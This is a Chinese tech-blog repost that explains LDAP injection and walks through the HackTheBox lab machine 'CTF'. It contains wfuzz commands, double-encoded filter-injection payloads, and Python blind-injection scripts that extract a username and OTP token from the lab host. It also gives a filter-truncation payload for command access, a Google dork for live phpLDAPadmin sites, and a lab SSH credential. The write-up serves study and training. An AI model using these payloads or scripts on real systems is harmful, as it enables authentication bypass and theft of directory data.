<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>黑客大神淺談LDAP注入攻擊 | 极客快訊</title><meta property="og:title" content="黑客大神淺談LDAP注入攻擊 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/61c97d5efdb1486fa6cba6f334bfbd0f"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="黑客大神淺談LDAP注入攻擊"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/25042d8.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>黑客大神淺談LDAP注入攻擊</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>最近在HackTheBox上氪了金（肉疼�），做了一些已經retired的高質量邏輯，不得不說質量還是很高的。其中有一個靶機叫做<strong>CTF</strong>，難度是最高級別的insane，主要是它考察的知識點比較冷門——LDAP注入。可能很多小夥伴都沒怎麼聽說過這個漏洞，我想主要原因還是LDAP這個協議用的比較少，而且國內CTF比賽中我也基本上沒有看到有考察這個點的。在網上搜了一下，發現最近一次出現這個考點的是在CSAW CTF Qualification Round 2018比賽中，題目直接告訴你了是考LDAP注入。剛好上個星期我在星盟內部分享中，也提到了這個知識點，那麼本著聊勝於無，開闊知識面的本意下（其實是偷懶？），寫下這篇淺談LDAP注入攻擊的文章。</p><p></p><h1 class=pgc-h-arrow-right><strong>0x01 LDAP介紹</strong></h1><h1 class=pgc-h-arrow-right><strong>什麼是LDAP</strong></h1><p>在做靶機之前，我們首先來了解一下什麼是LDAP？</p><p>以下內容部分摘自2018 blackhat <em>LDAP Injection & Blind LDAP Injection</em></p><p>LDAP(Lightweight Directory Access Protocol):輕量級目錄訪問協議，是一種在線目錄訪問協議，主要用於目錄中資源的搜索和查詢，是X.500的一種簡便的實現。</p><p>那麼轉換成人話就是說，LDAP是用於訪問目錄服務（特別是基於X.500的目錄服務）的輕量級客戶端服務器協議，它通過TCP/IP傳輸服務運行。關鍵的地方就在於，<strong>數據是存儲在目錄中，而不是數據庫中</strong>。的確，目錄和數據庫有很多共同之處，都能存儲數據、並能在一定程度進行搜索和查詢。這裡就有一個問題了，目錄和數據庫的區別在哪？</p><p>最重要的區別就是<strong>目錄適合於存放靜態數據</strong>，它存儲的數據無論在類型和種類較之數據庫中的數據都要更為繁多，包括音頻、視頻、可執行文件、文本等文件，另外目錄中還存在目錄的遞歸。既然是存放不同類型的靜態數據，那麼目錄服務在進行優化後更適宜於讀訪問，而非寫、修改等操作。</p><p>說了這麼半天，感覺還是貼一張圖來的更快。</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/61c97d5efdb1486fa6cba6f334bfbd0f><p class=pgc-img-caption></p></div><p><br></p><p>上面這張圖展示了LDAP的結構。我們都知道MySQL數據庫中的數據都是按記錄一條條記錄存在表中，而LDAP是樹結構的，數據存儲在葉子節點上。比如要描述上圖baby這個節點：</p><p>cn=baby, ou=marketing, ou=people, dc=mydomain, dc=org</p><h1 class=pgc-h-arrow-right><strong>LDAP的基本概念</strong></h1><p>在大概知道LDAP是做什麼、長什麼樣之後，我們再來了解一下LDAP的一些基本概念，主要是三個專有名詞：條目（Entry）、屬性（Attribute）、對象類（ObjectClass）。</p><p><strong>條目</strong></p><p>條目，也叫記錄項，是LDAP中最基本的顆粒，就像字典中的詞條或者是數據中的記錄。通常對LDAP的添加、刪除、修改、搜索都是以條目為基本單位。</p><p><strong>屬性</strong></p><p>每個條目都可以有很多屬性（Attribute），比如常見的人都有姓名、地址、電話等屬性。每個屬性都有名稱及對應的值，屬性值可以有單個、多個，比如你有多個郵箱。</p><p>此外，LDAP為人員組織機構中常見的對象都設計了屬性(比如commonName，surname)。</p><p><strong>對象類</strong></p><p>對象類是屬性的集合，LDAP預想了很多人員組織機構中常見的對象，並將其封裝成對象類。比如人員（person）含有姓（sn）、名（cn）、電話(telephoneNumber)、密碼(userPassword)等屬性，單位職工(organizationalPerson)是人員(person)的繼承類，除了上述屬性之外還含有職務（title）、郵政編碼（postalCode）、通信地址(postalAddress)等屬性。</p><p>通過對象類可以方便的定義條目類型。每個條目可以直接繼承多個對象類，這樣就繼承了各種屬性。如果2個對象類中有相同的屬性，則條目繼承後只會保留1個屬性。對象類同時也規定了哪些屬性是基本信息，即必要屬性和可選屬性。</p><p>是不是聽起來和面嚮對象語言有點相似，跟Java中的Object類一樣，LDAP的根對象類就叫做top。</p><p>上述就是筆者對LDAP數據結構的簡單介紹了，LDAP既然主要用於搜索查詢，那它是怎麼查詢的呢？</p><h1 class=pgc-h-arrow-right><strong>LDAP的基本語法</strong></h1><p>LDAP的語法非常簡單，一看就會，再看就懂。</p><p>以下部分內容摘自https://blog.csdn.net/leader_ww/article/details/4028672</p><p><strong>=（等於）</strong></p><p>例如，如果希望查找屬性giveNname值為John的所有對象，可以使用(givenName=John)。這會返回對應條件的所有對象。</p><p><strong>&（邏輯與）</strong></p><p>例如，如果希望查找居住在 Dallas 並且givenName為John的所有對象，可以使用(&(givenName=John)(l=Dallas))。</p><p>請注意，每個參數都被屬於其自己的圓括號括起來。整個 LDAP 語句必須包括在一對主圓括號中。操作符 & 表明，只有每個參數都為真，才會將此篩選條件應用到要查詢的對象。</p><p><strong>|（邏輯或）</strong></p><p>例如，如果希望查找屬性givenName值為Jhon或者Jack的所有對象，可以使用(|(givenName=Jhon)(givenName=Jack))。</p><p><strong>!（邏輯非）</strong></p><p>例如，如果需要查找givenName為John的對象以外的所有對象。則應使用如下語句：(!givenName=John)</p><p><strong>*（通配符）</strong></p><p>可使用通配符表示值可以等於任何值。使用它的情況可能是：您希望查找具有職務頭銜的所有對象。為此，可以使用(title=*)，這會返回title屬性包含內容的所有對象。</p><p>另一個例子是：您知道某個對象的givenName屬性的開頭兩個字母是“Jo”。那麼，可以使用(givenName=Jo*)進行查找，這會返回givenName以Jo開頭的所有對象。</p><p>Over~~LDAP的語法是不是很簡單。</p><p>說了這麼多，可能很多小夥伴還是心存疑問，已經部署成功的LDAP到底是長什麼樣子？</p><p>我們可以通過Google Hacking intitle:”phpLDAPadmin” inurl:cmd.php來檢索一下，真實的運行的LDAP服務的網站，這個地方我就貼一張圖示範一下，包含了上面提到的所有概念。</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/298fe0a3ab8a4376bd6e7defb494b629><p class=pgc-img-caption></p></div><p><br></p><h1 class=pgc-h-arrow-right><strong>0x02 LDAP注入攻擊面</strong></h1><p>其實它的攻擊手法和SQL注入的原理非常相似，在有漏洞的環境中，這些查詢參數沒有得到合適的過濾，因而攻擊者可以注入任意惡意代碼。由於比較簡單，我這裡就走馬觀花的方式來過一遍LDAP注入的不同類型。</p><p>以下部分內容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p><h1 class=pgc-h-arrow-right><strong>AND注入</strong></h1><p>這種情況，應用會構造由”&”操作符和用戶引入的的參數組成的正常查詢在LDAP目錄中搜索，例如：</p><p>(&(parameter1=value1)(parameter2=value2))</p><p>這裡Value1和value2是在LDAP目錄中搜索的值，攻擊者可以注入代碼，維持正確的過濾器結構但能使用查詢實現他自己的目標。</p><p>比如說，為了驗證客戶端提供的user/password對，構造如下LDAP過濾器併發送給LDAP服務器：</p><p>(&(USER=Uname)(PASSWORD=Pwd))</p><p>如果攻擊者輸入一個有效的用戶名，如r00tgrok，然後在這個名字後面注入恰當的語句，password檢查就會被繞過。</p><p>使得Uname=slisberger)(&))，引入任何字符串作為Pwd值，構造如下查詢併發送給服務器：</p><p>(&(USER= slisberger)(&)(PASSWORD=Pwd))</p><h1 class=pgc-h-arrow-right><strong>OR注入</strong></h1><p>這種情況，應用會構造由”|”操作符和用戶引入的的參數組成的正常查詢在LDAP目錄中搜索，例如：</p><p>(|(parameter1=value1)(parameter2=value2))</p><p>這裡Value1和value2是在LDAP目錄中搜索的值，攻擊者可以注入代碼，維持正確的過濾器結構但能使用查詢實現他自己的目標。</p><p>類似的，加入現在用於展示可用資源的查詢為：</p><p>(|(type=Rsc1)(type=Rsc2))</p><p>Rsc1和Rsc2表示系統中不同種類的資源。如果攻擊者輸入Rsc=printer)(uid=*)，則下面的查詢被髮送給服務器：</p><p>(|(type=printer)(uid=*))(type=scanner)</p><p>這樣也會造成注入的產生。</p><h1 class=pgc-h-arrow-right><strong>盲注</strong></h1><p>SQL注入中有盲注，LDAP中也存在這種問題，包括下面介紹到的靶機用到的也是盲注的手法。</p><p>假設攻擊者可以從服務器響應中推測出什麼，儘管應用沒有報出錯信息，LDAP過濾器中注入的代碼卻生成了有效的響應或錯誤。攻擊者可以利用這一行為向服務器問正確的或錯誤的問題。</p><p>還是用一個例子來說明。</p><p>假設一個Web應用想從一個LDAP目錄列出所有可用的Epson打印機，錯誤信息不會返回，應用發送如下的過濾器：</p><p>(&(objectClass=printer)(type=Epson*))</p><p>使用這個查詢，如果有可用的Epson打印機，其圖標就會顯示給客戶端，否則沒有圖標出現。如果攻擊者進行LDAP盲注入攻擊</p><p>*)(objectClass=*))(&(objectClass=void</p><p>Web應用會構造如下查詢：</p><p>(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Epson*))</p><p><strong>僅第一個LDAP過濾器會被處理</strong>：</p><p>(&(objectClass=*)(objectClass=*))</p><p>那麼這樣就和我們查詢的初衷相違背了。</p><p>接下來就是這篇文章的重頭戲了，我們主要從這個邏機中學到兩點：</p><p>• 怎麼發現LDAP注入漏洞</p><p>• 如何利用LDAP注入漏洞</p><p></p><h1 class=pgc-h-arrow-right><strong>0x03 從HTB靶機中學習LDAP注入</strong></h1><h1 class=pgc-h-arrow-right><strong>Initial Enunciation</strong></h1><p>拿到靶機先用Nmap掃一下端口</p><p># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</p><p><br></p><p>Nmap scan report for ctf.htb (10.10.10.122)</p><p><br></p><p>Host is up (1.8s latency).</p><p><br></p><p>Not shown: 998 filtered ports</p><p><br></p><p>PORT STATE SERVICE VERSION</p><p><br></p><p>22/tcp open ssh OpenSSH 7.4 (protocol 2.0)</p><p><br></p><p>| ssh-hostkey:</p><p><br></p><p>| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</p><p><br></p><p>| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</p><p><br></p><p>|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</p><p><br></p><p>80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)</p><p><br></p><p>|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</p><p><br></p><p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p><p><br></p><p># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</p><p><br></p><p>查看80端口</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/165021c8835241e39052ed399c3d1430><p class=pgc-img-caption></p></div><p><br></p><p>大概的意思就是讓我們嘗試去登錄這個系統，但是不能用SQLmap或者Dirbuster去暴力猜解用戶名和密碼。</p><p>再去登錄界面看一下：</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9b90fea6c4bb43e893e2b3f82b1c1536><p class=pgc-img-caption></p></div><p><br></p><p>提示我們是一個OTP，即One Time Password，一般而言是1分鐘更新一次。</p><p>查看源碼，發現有一個Hint</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/1ac9457533774785a09522598a01300e><p class=pgc-img-caption></p></div><p><br></p><p>如果比較熟悉LDAP的話，這裡的兩個名詞schema和existing attribute已經提示了是關於LDAP注入。</p><p>作者用一個已知的屬性去存儲了81位的token string，Google搜一下token string (81 digits)。</p><p>https://www.systutorials.com/docs/linux/man/1-stoken/</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/df78e6450de440d8bd967f577c3a02d4><p class=pgc-img-caption></p></div><p><br></p><p>可以看到一個關鍵的地方，Pure numeric (81-digit) "ctf" (compressed token format) strings，和靶機的題目相契合，現在就有一點思路了，應該要去找到這個81位純數字的token，然後用stoken工具去生成OTP。那麼主要是找到token，唯一可以利用的就是這個登錄框了。</p><p>先隨便用某個用戶名和密碼登錄admin:1234</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0bd1e743ecd14f4a8b8f58e751f153c8><p class=pgc-img-caption></p></div><p><br></p><p>返回User admin not found，再用SQL注入的萬能密碼試一試</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/ed711959c3f8496d8720c6c00cd2bc4a><p class=pgc-img-caption></p></div><p><br></p><p>直接是沒有任何顯示，應該是對一些特殊字符有黑名單過濾。Fuzz一下過濾了一些什麼字符</p><p>wfuzz -c --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w special-chars.txt 10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a2a1da791b4a44578fa2d80ae2b12fcc><p class=pgc-img-caption></p></div><p><br></p><p>—hw 233 代表過濾掉形如User xxx not found的返回信息。</p><p>我們發現+和&返回的是232 Words，但是在頁面測試一下</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f378d72adb6940319b75647329c5ab44><p class=pgc-img-caption></p></div><p><br></p><p>發現返回的還是User + not found或者User & not found，這樣的話應該是233 Words，而不是Wfuzz返回的232 Words。</p><p>我們嘗試把這些特殊字符二次URL編碼，看Web應用是否還能解析，用seclists中的doble<em>uri</em>hex.txt作為字典</p><p>wfuzz -c --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt 10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/02c27723feb541f6b1e1f409d5e9435e><p class=pgc-img-caption></p></div><p><br></p><p>最後Fuzz出來的被過濾的字符就是</p><p>%2500 ---> %00</p><p><br></p><p>%2528 ---> (</p><p><br></p><p>%2529 ---> )</p><p><br></p><p>%252a ---> *</p><p><br></p><p>%255c ---> \</p><p><br></p><p>這些被過濾的字符就是LDAP注入需要過濾的所有字符，再結合login.php頁面源代碼中的hint，可以確定是LDAP注入。</p><h1 class=pgc-h-arrow-right><strong>Getting User Access</strong></h1><p>先來看LDAP注入的最基本形式</p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ca01h%00)</p><p><br></p><p>)</p><p><br></p><p>具體到這個靶機的話，我們需要猜解括號的個數。運用類似盲注的思想，如果注入成功，那麼就會返回User ca01h not found。</p><p>假設只有一個括號：</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a3c0ffaac6ea417d8b3625b0b4310c8c><p class=pgc-img-caption></p></div><p><br></p><p>假設有兩個括號：</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/007eba3e4c9e48cbac3ab3ae5504ebbb><p class=pgc-img-caption></p></div><p><br></p><p>假設有三個括號：</p><p>當嘗試到三個括號用於閉合時，成功返回了User ca01h%29%29%29%00 not found，那麼這個登錄框的LDAP查詢的基本形式就是</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ca01h)))%00</p><p><br></p><p>)</p><p><br></p><p>(&|</p><p><br></p><p>(other comparing)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>接著，我們再回頭去看一下Fuzz出來的被過濾的字符，其中%25%2a返回的消息長度為231 Words</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/2230a73c0bcc4e5b90ae8a84dbce9a79><p class=pgc-img-caption></p></div><p><br></p><p>發現迴響的消息是Cannot login，說明可以用*通配符來盲注用戶名，腳本如下：</p><p><em>#!/usr/bin/env python3</em></p><p><br></p><p><em>### username_burp.py</em></p><p><br></p><p>import sys</p><p><br></p><p>import time</p><p><br></p><p>from string import ascii_lowercase</p><p><br></p><p>from urllib.parse import quote_plus</p><p><br></p><p>import requests</p><p><br></p><p>URL = 'http://10.10.10.122/login.php'</p><p><br></p><p>username, done = '', False</p><p><br></p><p>print()</p><p><br></p><p><strong>while</strong> <strong>not</strong> done:</p><p><br></p><p><strong>for</strong> c <strong>in</strong> ascii_lowercase:</p><p><br></p><p>payload = username + c + quote_plus('*')</p><p><br></p><p>data = {</p><p><br></p><p>'inputUsername': payload,</p><p><br></p><p>'inputOTP': '1234'</p><p><br></p><p>}</p><p><br></p><p>resp = requests.post(URL, data=data)</p><p><br></p><p><strong>if</strong> 'Cannot login' <strong>in</strong> resp.text:</p><p><br></p><p>username += c</p><p><br></p><p><strong>break</strong></p><p><br></p><p>sys.stdout.write(f'\r{username}{c}')</p><p><br></p><p>time.sleep(0.2)</p><p><br></p><p><strong>else</strong>:</p><p><br></p><p>done = True</p><p><br></p><p>print(f'[+] Username: {username} \n')</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/db2c4517948b46638e1b47713a862a5f><p class=pgc-img-caption></p></div><p><br></p><p>用戶名為ldapuser</p><p>知道了用戶名之後，我們就要去獲取生成OTP的81位token，通過頁面源代碼的提示，這個token存儲在某一個LDAP默認已經存在的屬性當中。而默認的屬性可以在PayloadsAllTheThings中找到：</p><p>c</p><p><br></p><p>cn</p><p><br></p><p>co</p><p><br></p><p>commonName</p><p><br></p><p>dc</p><p><br></p><p>facsimileTelephoneNumber</p><p><br></p><p>givenName</p><p><br></p><p>gn</p><p><br></p><p>homePhone</p><p><br></p><p>id</p><p><br></p><p>jpegPhoto</p><p><br></p><p>l</p><p><br></p><p>mail</p><p><br></p><p>mobile</p><p><br></p><p>name</p><p><br></p><p>o</p><p><br></p><p>objectClass</p><p><br></p><p>ou</p><p><br></p><p>owner</p><p><br></p><p>pager</p><p><br></p><p>password</p><p><br></p><p>sn</p><p><br></p><p>st</p><p><br></p><p>surname</p><p><br></p><p>uid</p><p><br></p><p>username</p><p><br></p><p>userPassword</p><p><br></p><p>如果不想寫腳本的話用wfuzz來Fuzz靶機的LDAP中存在的屬性可能會更快一些，但還是要先找到注入的形式：</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ldapuser)</p><p><br></p><p>(FUZZ=*)</p><p><br></p><p>)</p><p><br></p><p>(&|</p><p><br></p><p>(other comparing)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>此外還要把注入的字符ldapuser)(FUZZ=*進行二次URL編碼，編碼之後的結果ldapuser%2529%2528FUZZ%253d%252a。</p><p>wfuzz -c --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt http://10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/c842ee47435f4053be0b892b8db96bc2><p class=pgc-img-caption></p></div><p><br></p><p>我們Fuzz出來了這麼些屬性是存在於靶機的LDAP服務中的，現在的工作就是一個一個的屬性來拆解，屬於一些重複性的工作，就不在這裡過多贅述了，最後可以找到token是存儲於pager屬性中。接著寫腳本用來burp81位token</p><p><em>#!/usr/bin/python3</em></p><p><br></p><p><em># pager_burp.py</em></p><p><br></p><p>import requests</p><p><br></p><p>import sys</p><p><br></p><p>from time import sleep</p><p><br></p><p>from string import digits</p><p><br></p><p>token = ""</p><p><br></p><p>URL = "http://10.10.10.122/login.php"</p><p><br></p><p>attribute = "pager"</p><p><br></p><p>loop = 1</p><p><br></p><p><strong>while</strong> loop > 0:</p><p><br></p><p><strong>for</strong> digit <strong>in</strong> digits:</p><p><br></p><p>token = token</p><p><br></p><p><em># ldapuser)(pager=&lt;token>)*</em></p><p><br></p><p>payload = f"ldapuser%29%28{attribute}%3d{token}{digit}%2a"</p><p><br></p><p>data = {"inputUsername": payload, "inputOTP": "1234"}</p><p><br></p><p>r = requests.post(URL, data=data)</p><p><br></p><p>sys.stdout.write(f"\rToken: {token}{digit}")</p><p><br></p><p>sleep(0.5)</p><p><br></p><p><strong>if</strong> b"Cannot login" <strong>in</strong> r.content:</p><p><br></p><p>token += digit</p><p><br></p><p><strong>break</strong></p><p><br></p><p><strong>elif</strong> digit == "9":</p><p><br></p><p>loop = 0</p><p><br></p><p><strong>break</strong></p><p><br></p><p>print(f'[+] Token: {token} \n')</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/550eab002ab54565ada286975a600954><p class=pgc-img-caption></p></div><p><br></p><p>這裡值得注意的是需要刪掉最後的一個9，所以最後的token就是：</p><p>285449490011357156531651545652335570713167411445727140604172141456711102716717000</p><p>接著用stoken工具導入token</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/af97a44f8e6a4c2db9b7c0cd15e33f44><p class=pgc-img-caption></p></div><p><br></p><p>生成OTP</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/5854a9018bb14279ad1a343cb8364d4f><p class=pgc-img-caption></p></div><p><br></p><p>成功登錄後，跳轉到page.php頁面，可以執行命令</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/5f1aa64aebe74e04a63bf69441bca3fb><p class=pgc-img-caption></p></div><p><br></p><p>Damn it…..提示我們ldapuser權限不夠不能執行命令，這裡有兩種辦法：</p><p>• 對</p><p>group</p><p>屬性進行注入，即把後面group屬性的filter截斷</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(pager=&lt;token>)</p><p><br></p><p>(uid=ldapuser)))%00</p><p><br></p><p>)</p><p><br></p><p>(|</p><p><br></p><p>(group=root)</p><p><br></p><p>(group=adm)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>• 使用*通配符作為用戶名登錄</p><p>這裡演示一下第一種方案，payload直接放到burp中</p><p>ldapuser%2529%2529%2529%2500</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8dd727e4ba0c4df8a1427ca0a639c631><p class=pgc-img-caption></p></div><p><br></p><p>再去執行ls命令</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/753f782d42814ee188241c479d4a9104><p class=pgc-img-caption></p></div><p><br></p><p>讀取page.php文件：</p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/60076d12a93b4c938ce236a6cb86a361><p class=pgc-img-caption></p></div><p><br></p><p>SSH登錄：fdapuser:e398e27d5c4ad45086fe431120932a01</p><p></p><div class=pgc-img><img alt=黑客大神淺談LDAP注入攻擊 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/58450574c0424f23931024d831dc8a59><p class=pgc-img-caption></p></div><p><br></p><p>原文地址：https://www.anquanke.com/post/id/212186</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>淺談</a></li><li><a>LDAP</a></li><li><a>攻擊</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/8c705a95.html alt=淺談無人機傾斜攝影測量技術標準 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/433b0001f1761786a418 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8c705a95.html title=淺談無人機傾斜攝影測量技術標準>淺談無人機傾斜攝影測量技術標準</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/32b07cdf.html alt=淺談虛擬現實技術在實際中的應用是什麼？你的看法是？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/320e000488d3da066723 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/32b07cdf.html title=淺談虛擬現實技術在實際中的應用是什麼？你的看法是？>淺談虛擬現實技術在實際中的應用是什麼？你的看法是？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/218a90a9.html alt=淺談廣西沿海鐵路公司，到底寧局好還是沿海好？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/153102100759992f2d934f2 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/218a90a9.html title=淺談廣西沿海鐵路公司，到底寧局好還是沿海好？>淺談廣西沿海鐵路公司，到底寧局好還是沿海好？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/0bbe5cba.html alt=淺談廣西高鐵里程，曾經以1700多公里奪冠，創下了輝煌史！ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/pgc-image/dbb04b7e14834fdda0eedea1205e664a style=border-radius:25px></a>
